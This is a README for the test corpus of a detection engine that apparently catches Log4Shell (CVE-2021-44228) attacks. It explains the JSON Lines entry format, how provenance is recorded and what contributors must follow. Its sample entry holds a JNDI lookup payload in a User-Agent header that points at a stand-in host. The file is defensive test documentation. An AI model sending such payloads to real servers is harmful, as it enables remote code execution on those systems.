# Corpora

Test data for the detection engine, as JSON Lines (one entry per line).

| Directory | Purpose |
|---|---|
| `bypass/` | Attacks and evasions that must be caught, each with provenance and the verdict the engine must reach. |
| `benign/` | Legitimate traffic and look-alikes (templates, shell, base64, charsets) that must not be blocked. |

A much larger benign set (100,000 requests) is generated deterministically by
`corpus.Generate`; it is not stored. Results are in
[docs/eval/report.md](../docs/eval/report.md), refreshed by `make eval`.

## Entry format

```json
{"id":"fastly-baseline","class":"public-sample",
 "source":{"type":"public-sample","ref":"Fastly Security Research, 2021-12-14: ...","url":"https://..."},
 "cves":["CVE-2021-44228"],
 "request":{"method":"GET","target":"/","headers":[["User-Agent","${jndi:ldap://example.com:1234/callback}"]]},
 "expect":{"decision":"malicious","rules":["LSH-1001"]},
 "note":"optional"}
```

- `decision` is `clean`, `suspicious` or `malicious`. `rules` must all fire;
  `forbid` must not.
- Bodies go in `body` (text) or `body_b64` (bytes).
- `source.type` is one of:
  - `public-sample`: quoted from a public write-up (needs `ref` and an `https` `url`);
    reserved names replace real hosts.
  - `derived`: constructed to exercise a technique a public source documents (needs `ref`).
  - `project`: written by this project.

## Rules for contributions

1. **Inert only.** Hosts must be reserved names: `*.invalid`, `*.example`,
   `example.com/.net/.org`, `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`,
   or loopback. `go test` rejects anything else.
2. **Provenance is mandatory.** Say where the technique comes from. Do not label
   something `public-sample` unless it is quoted from the cited page.
3. **A fixed bypass gets a regression entry** in the same change that fixes it.
4. **Never weaken an expectation to make a test pass.** If an entry is wrong,
   say why in the commit message.
